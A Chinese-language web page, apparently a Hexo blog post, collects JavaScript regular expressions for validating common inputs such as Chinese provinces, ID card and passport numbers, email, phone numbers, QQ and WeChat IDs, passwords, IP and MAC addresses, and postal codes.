<h4 id="中国省"><a href="#中国省" class="headerlink" title="中国省"></a>中国省</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^浙江|上海|北京|天津|重庆|黑龙江|吉林|辽宁|内蒙古|河北|新疆|甘肃|青海|陕西|宁夏|河南|山东|山西|安徽|湖北|湖南|江苏|四川|贵州|云南|广西|西藏|江西|广东|福建|台湾|海南|香港|澳门$/</span><br></pre></td></tr></table></figure>

<h4 id="可以被moment转化成功的时间-YYYYMMDD-HH-mm-ss"><a href="#可以被moment转化成功的时间-YYYYMMDD-HH-mm-ss" class="headerlink" title="可以被moment转化成功的时间 YYYYMMDD HH:mm:ss"></a>可以被moment转化成功的时间 YYYYMMDD HH:mm:ss</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\d&#123;<span class="number">4</span>&#125;([<span class="regexp">/:-\S])(1[0-2]|0?[1-9])\1(0?[1-9]|[1-2]\d|30|31) (?:[01]\d|2[0-3]):[0-5]\d:[0-5]\d$/</span></span><br></pre></td></tr></table></figure>

<h4 id="email-邮箱"><a href="#email-邮箱" class="headerlink" title="email(邮箱)"></a>email(邮箱)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(([^<span class="xml"><span class="tag">&lt;&gt;</span>()[\]\\.,;:\s@"]+(\.[^<span class="tag">&lt;&gt;</span>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/</span></span><br></pre></td></tr></table></figure>

<h4 id="座机-tel-phone-电话-国内-如-0341-86091234"><a href="#座机-tel-phone-电话-国内-如-0341-86091234" class="headerlink" title="座机(tel phone)电话(国内),如: 0341-86091234"></a>座机(tel phone)电话(国内),如: 0341-86091234</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?:(?:\d&#123;<span class="number">3</span>&#125;-)?\d&#123;<span class="number">8</span>&#125;|^(?:\d&#123;<span class="number">4</span>&#125;-)?\d&#123;<span class="number">7</span>,<span class="number">8</span>&#125;)(?:-\d+)?$/</span><br></pre></td></tr></table></figure>

<h4 id="身份证号-1代-15位数字"><a href="#身份证号-1代-15位数字" class="headerlink" title="身份证号(1代,15位数字)"></a>身份证号(1代,15位数字)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[<span class="number">1</span><span class="number">-9</span>]\d&#123;<span class="number">7</span>&#125;(?:<span class="number">0</span>\d|<span class="number">10</span>|<span class="number">11</span>|<span class="number">12</span>)(?:<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">1</span><span class="number">-2</span>][\d]|<span class="number">30</span>|<span class="number">31</span>)\d&#123;<span class="number">3</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="身份证号-2代-18位数字-最后一位是校验位-可能为数字或字符X"><a href="#身份证号-2代-18位数字-最后一位是校验位-可能为数字或字符X" class="headerlink" title="身份证号(2代,18位数字),最后一位是校验位,可能为数字或字符X"></a>身份证号(2代,18位数字),最后一位是校验位,可能为数字或字符X</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[<span class="number">1</span><span class="number">-9</span>]\d&#123;<span class="number">5</span>&#125;(?:<span class="number">18</span>|<span class="number">19</span>|<span class="number">20</span>)\d&#123;<span class="number">2</span>&#125;(?:<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|<span class="number">10</span>|<span class="number">11</span>|<span class="number">12</span>)(?:<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">1</span><span class="number">-2</span>]\d|<span class="number">30</span>|<span class="number">31</span>)\d&#123;<span class="number">3</span>&#125;[\dXx]$/</span><br></pre></td></tr></table></figure>

<h4 id="身份证号-支持1-2代-15位-18位数字"><a href="#身份证号-支持1-2代-15位-18位数字" class="headerlink" title="身份证号, 支持1/2代(15位/18位数字)"></a>身份证号, 支持1/2代(15位/18位数字)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\d&#123;<span class="number">6</span>&#125;((((((<span class="number">19</span>|<span class="number">20</span>)\d&#123;<span class="number">2</span>&#125;)(<span class="number">0</span>[<span class="number">13</span><span class="number">-9</span>]|<span class="number">1</span>[<span class="number">012</span>])(<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">12</span>]\d|<span class="number">30</span>))|(((<span class="number">19</span>|<span class="number">20</span>)\d&#123;<span class="number">2</span>&#125;)(<span class="number">0</span>[<span class="number">13578</span>]|<span class="number">1</span>[<span class="number">02</span>])<span class="number">31</span>)|((<span class="number">19</span>|<span class="number">20</span>)\d&#123;<span class="number">2</span>&#125;)<span class="number">02</span>(<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|<span class="number">1</span>\d|<span class="number">2</span>[<span class="number">0</span><span class="number">-8</span>])|((((<span class="number">19</span>|<span class="number">20</span>)([<span class="number">13579</span>][<span class="number">26</span>]|[<span class="number">2468</span>][<span class="number">048</span>]|<span class="number">0</span>[<span class="number">48</span>]))|(<span class="number">2000</span>))<span class="number">0229</span>))\d&#123;<span class="number">3</span>&#125;)|((((\d&#123;<span class="number">2</span>&#125;)(<span class="number">0</span>[<span class="number">13</span><span class="number">-9</span>]|<span class="number">1</span>[<span class="number">012</span>])(<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">12</span>]\d|<span class="number">30</span>))|((\d&#123;<span class="number">2</span>&#125;)(<span class="number">0</span>[<span class="number">13578</span>]|<span class="number">1</span>[<span class="number">02</span>])<span class="number">31</span>)|((\d&#123;<span class="number">2</span>&#125;)<span class="number">02</span>(<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|<span class="number">1</span>\d|<span class="number">2</span>[<span class="number">0</span><span class="number">-8</span>]))|(([<span class="number">13579</span>][<span class="number">26</span>]|[<span class="number">2468</span>][<span class="number">048</span>]|<span class="number">0</span>[<span class="number">048</span>])<span class="number">0229</span>))\d&#123;<span class="number">2</span>&#125;))(\d|X|x)$/</span><br></pre></td></tr></table></figure>

<h4 id="护照（包含香港、澳门）"><a href="#护照（包含香港、澳门）" class="headerlink" title="护照（包含香港、澳门）"></a>护照（包含香港、澳门）</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/(^[EeKkGgDdSsPpHh]\d&#123;<span class="number">8</span>&#125;$)|(^(([Ee][a-fA-F])|([DdSsPp][Ee])|([Kk][Jj])|([Mm][Aa])|(<span class="number">1</span>[<span class="number">45</span>]))\d&#123;<span class="number">7</span>&#125;$)/</span><br></pre></td></tr></table></figure>

<h4 id="帐号是否合法-字母开头，允许5-16字节，允许字母数字下划线组合"><a href="#帐号是否合法-字母开头，允许5-16字节，允许字母数字下划线组合" class="headerlink" title="帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线组合"></a>帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线组合</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z]\w&#123;<span class="number">4</span>,<span class="number">15</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="中文-汉字"><a href="#中文-汉字" class="headerlink" title="中文/汉字"></a>中文/汉字</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?:[\u3400-\u4DB5\u4E00-\u9FEA\uFA0E\uFA0F\uFA11\uFA13\uFA14\uFA1F\uFA21\uFA23\uFA24\uFA27-\uFA29]|[\uD840-\uD868\uD86A-\uD86C\uD86F-\uD872\uD874-\uD879][\uDC00-\uDFFF]|\uD869[\uDC00-\uDED6\uDF00-\uDFFF]|\uD86D[\uDC00-\uDF34\uDF40-\uDFFF]|\uD86E[\uDC00-\uDC1D\uDC20-\uDFFF]|\uD873[\uDC00-\uDEA1\uDEB0-\uDFFF]|\uD87A[\uDC00-\uDFE0])+$/</span><br></pre></td></tr></table></figure>

<h4 id="小数"><a href="#小数" class="headerlink" title="小数"></a>小数</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\d+\.\d+$/</span><br></pre></td></tr></table></figure>

<h4 id="只包含数字"><a href="#只包含数字" class="headerlink" title="只包含数字"></a>只包含数字</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\d+$/</span><br></pre></td></tr></table></figure>

<h4 id="html标签-宽松匹配"><a href="#html标签-宽松匹配" class="headerlink" title="html标签(宽松匹配)"></a>html标签(宽松匹配)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/<span class="xml"><span class="tag">&lt;<span class="name">(\w+)[^</span>&gt;</span>]*&gt;(.*?<span class="tag">&lt;<span class="name">\</span>/\<span class="attr">1</span>&gt;</span>)?/</span></span><br></pre></td></tr></table></figure>

<h4 id="匹配中文汉字和中文标点"><a href="#匹配中文汉字和中文标点" class="headerlink" title="匹配中文汉字和中文标点"></a>匹配中文汉字和中文标点</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/[\u4e00-\u9fa5|\u3002|\uff1f|\uff01|\uff0c|\u3001|\uff1b|\uff1a|\u201c|\u201d|\u2018|\u2019|\uff08|\uff09|\u300a|\u300b|\u3008|\u3009|\u3010|\u3011|\u300e|\u300f|\u300c|\u300d|\ufe43|\ufe44|\u3014|\u3015|\u2026|\u2014|\uff5e|\ufe4f|\uffe5]/</span><br></pre></td></tr></table></figure>

<h4 id="qq号格式正确"><a href="#qq号格式正确" class="headerlink" title="qq号格式正确"></a>qq号格式正确</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">4</span>,<span class="number">10</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="数字和字母组成"><a href="#数字和字母组成" class="headerlink" title="数字和字母组成"></a>数字和字母组成</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[A-Za-z0<span class="number">-9</span>]+$/</span><br></pre></td></tr></table></figure>

<h4 id="英文字母"><a href="#英文字母" class="headerlink" title="英文字母"></a>英文字母</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z]+$/</span><br></pre></td></tr></table></figure>

<h4 id="小写英文字母组成"><a href="#小写英文字母组成" class="headerlink" title="小写英文字母组成"></a>小写英文字母组成</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-z]+$/</span><br></pre></td></tr></table></figure>

<h4 id="大写英文字母"><a href="#大写英文字母" class="headerlink" title="大写英文字母"></a>大写英文字母</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[A-Z]+$/</span><br></pre></td></tr></table></figure>

<h4 id="密码强度校验，最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符"><a href="#密码强度校验，最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符" class="headerlink" title="密码强度校验，最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符"></a>密码强度校验，最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/^\S*(?=\S&#123;6,&#125;)(?=\S*\d)(?=\S*[A-Z])(?=\S*[a-z])(?=\S*[!@#$%^&amp;*? ])\S*$/</span><br></pre></td></tr></table></figure>

<h4 id="用户名校验，4到16位（字母，数字，下划线，减号）"><a href="#用户名校验，4到16位（字母，数字，下划线，减号）" class="headerlink" title="用户名校验，4到16位（字母，数字，下划线，减号）"></a>用户名校验，4到16位（字母，数字，下划线，减号）</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z0<span class="number">-9</span>_-]&#123;<span class="number">4</span>,<span class="number">16</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="ip-v4-端口"><a href="#ip-v4-端口" class="headerlink" title="ip-v4[:端口]"></a>ip-v4[:端口]</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^((\d|[<span class="number">1</span><span class="number">-9</span>]\d|<span class="number">1</span>\d\d|<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d|<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])\.)&#123;<span class="number">3</span>&#125;(\d|[<span class="number">1</span><span class="number">-9</span>]\d|<span class="number">1</span>\d\d|<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d|<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])(?::(?:[<span class="number">0</span><span class="number">-9</span>]|[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;|[<span class="number">1</span><span class="number">-5</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">4</span>&#125;|<span class="number">6</span>[<span class="number">0</span><span class="number">-4</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">3</span>&#125;|<span class="number">65</span>[<span class="number">0</span><span class="number">-4</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">2</span>&#125;|<span class="number">655</span>[<span class="number">0</span><span class="number">-2</span>][<span class="number">0</span><span class="number">-9</span>]|<span class="number">6553</span>[<span class="number">0</span><span class="number">-5</span>]))?$/</span><br></pre></td></tr></table></figure>

<h4 id="ip-v6-端口"><a href="#ip-v6-端口" class="headerlink" title="ip-v6[:端口]"></a>ip-v6[:端口]</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/(^(?:(?:(?:[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">7</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">6</span>&#125;:[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">5</span>&#125;:([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)?[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">4</span>&#125;:([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">2</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">3</span>&#125;:([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">3</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">2</span>&#125;:([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">4</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">6</span>&#125;((\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b)\.)&#123;<span class="number">3</span>&#125;(\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b))|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">5</span>&#125;:((\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b)\.)&#123;<span class="number">3</span>&#125;(\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b))|(::([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">5</span>&#125;((\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b)\.)&#123;<span class="number">3</span>&#125;(\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b))|([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;::([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">5</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(::([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">6</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">7</span>&#125;:))$)|(^\[(?:(?:(?:[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">7</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">6</span>&#125;:[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">5</span>&#125;:([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)?[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">4</span>&#125;:([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">2</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">3</span>&#125;:([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">3</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">2</span>&#125;:([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">4</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">6</span>&#125;((\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b)\.)&#123;<span class="number">3</span>&#125;(\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b))|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">5</span>&#125;:((\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b)\.)&#123;<span class="number">3</span>&#125;(\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b))|(::([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">5</span>&#125;((\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b)\.)&#123;<span class="number">3</span>&#125;(\b((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>])|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;))\b))|([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;::([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">5</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(::([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">0</span>,<span class="number">6</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)|(([<span class="number">0</span><span class="number">-9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;:)&#123;<span class="number">1</span>,<span class="number">7</span>&#125;:))\](?::(?:[<span class="number">0</span><span class="number">-9</span>]|[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;|[<span class="number">1</span><span class="number">-5</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">4</span>&#125;|<span class="number">6</span>[<span class="number">0</span><span class="number">-4</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">3</span>&#125;|<span class="number">65</span>[<span class="number">0</span><span class="number">-4</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">2</span>&#125;|<span class="number">655</span>[<span class="number">0</span><span class="number">-2</span>][<span class="number">0</span><span class="number">-9</span>]|<span class="number">6553</span>[<span class="number">0</span><span class="number">-5</span>]))?$)/i</span><br></pre></td></tr></table></figure>

<h4 id="16进制颜色"><a href="#16进制颜色" class="headerlink" title="16进制颜色"></a>16进制颜色</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/^#?([a-fA-F0-9]&#123;6&#125;|[a-fA-F0-9]&#123;3&#125;)$/</span><br></pre></td></tr></table></figure>

<h4 id="微信号-wx-，6至20位，以字母开头，字母，数字，减号，下划线"><a href="#微信号-wx-，6至20位，以字母开头，字母，数字，减号，下划线" class="headerlink" title="微信号(wx)，6至20位，以字母开头，字母，数字，减号，下划线"></a>微信号(wx)，6至20位，以字母开头，字母，数字，减号，下划线</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z][-_a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">5</span>,<span class="number">19</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="邮政编码-中国"><a href="#邮政编码-中国" class="headerlink" title="邮政编码(中国)"></a>邮政编码(中国)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(<span class="number">0</span>[<span class="number">1</span><span class="number">-7</span>]|<span class="number">1</span>[<span class="number">0</span><span class="number">-356</span>]|<span class="number">2</span>[<span class="number">0</span><span class="number">-7</span>]|<span class="number">3</span>[<span class="number">0</span><span class="number">-6</span>]|<span class="number">4</span>[<span class="number">0</span><span class="number">-7</span>]|<span class="number">5</span>[<span class="number">1</span><span class="number">-7</span>]|<span class="number">6</span>[<span class="number">1</span><span class="number">-7</span>]|<span class="number">7</span>[<span class="number">0</span><span class="number">-5</span>]|<span class="number">8</span>[<span class="number">013</span><span class="number">-6</span>])\d&#123;<span class="number">4</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="中文和数字"><a href="#中文和数字" class="headerlink" title="中文和数字"></a>中文和数字</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^((?:[\u3400-\u4DB5\u4E00-\u9FEA\uFA0E\uFA0F\uFA11\uFA13\uFA14\uFA1F\uFA21\uFA23\uFA24\uFA27-\uFA29]|[\uD840-\uD868\uD86A-\uD86C\uD86F-\uD872\uD874-\uD879][\uDC00-\uDFFF]|\uD869[\uDC00-\uDED6\uDF00-\uDFFF]|\uD86D[\uDC00-\uDF34\uDF40-\uDFFF]|\uD86E[\uDC00-\uDC1D\uDC20-\uDFFF]|\uD873[\uDC00-\uDEA1\uDEB0-\uDFFF]|\uD87A[\uDC00-\uDFE0])|(\d))+$/</span><br></pre></td></tr></table></figure>

<h4 id="不能包含字母"><a href="#不能包含字母" class="headerlink" title="不能包含字母"></a>不能包含字母</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[^A-Za-z]*$/</span><br></pre></td></tr></table></figure>

<h4 id="java包名"><a href="#java包名" class="headerlink" title="java包名"></a>java包名</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^([a-zA-Z_]\w*)+([.][a-zA-Z_]\w*)+$/</span><br></pre></td></tr></table></figure>

<h4 id="mac地址"><a href="#mac地址" class="headerlink" title="mac地址"></a>mac地址</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^((([a-f0<span class="number">-9</span>]&#123;<span class="number">2</span>&#125;:)&#123;<span class="number">5</span>&#125;)|(([a-f0<span class="number">-9</span>]&#123;<span class="number">2</span>&#125;-)&#123;<span class="number">5</span>&#125;))[a-f0<span class="number">-9</span>]&#123;<span class="number">2</span>&#125;$/i</span><br></pre></td></tr></table></figure>

<h4 id="匹配连续重复的字符"><a href="#匹配连续重复的字符" class="headerlink" title="匹配连续重复的字符"></a>匹配连续重复的字符</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/(.)\<span class="number">1</span>+<span class="regexp">/</span></span><br></pre></td></tr></table></figure>

